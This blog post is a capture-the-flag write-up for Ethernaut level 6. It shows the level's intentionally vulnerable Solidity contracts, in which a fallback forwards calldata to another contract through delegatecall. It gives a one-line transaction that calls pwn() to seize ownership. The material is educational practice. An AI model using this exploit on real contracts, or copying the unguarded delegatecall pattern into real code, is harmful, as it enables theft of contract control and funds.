---
layout: post
title: Ethernaut - 6. Delegation
date:  2022-08-27
tags: ethernaut solidity
---

## Difficulty: 🌕🌕🌑🌑🌑
> The goal of this level is for you to claim ownership of the instance you are given.<br /><br />
  Things that might help<br /><br />
  - Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
  - Fallback methods
  - Method ids

## Contract
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

## Writeup

1. Get new Instance .
2. Call the method 
  ``` solidity

   await contract.sendTransaction({data: web3.eth.abi.encodeFunctionSignature("pwn()")})

   ```
   You can find the detail about `encodeFunctionSignature()` in [there](https://web3js.readthedocs.io/en/v1.2.11/web3-eth-abi.html#encodefunctionsignature) .
3. Submit instance ξ( ✿＞◡❛)

### Learn delegatecall ( solidity version 0.8.13 )
[Solidity by example - delegatecall](https://solidity-by-example.org/delegatecall/)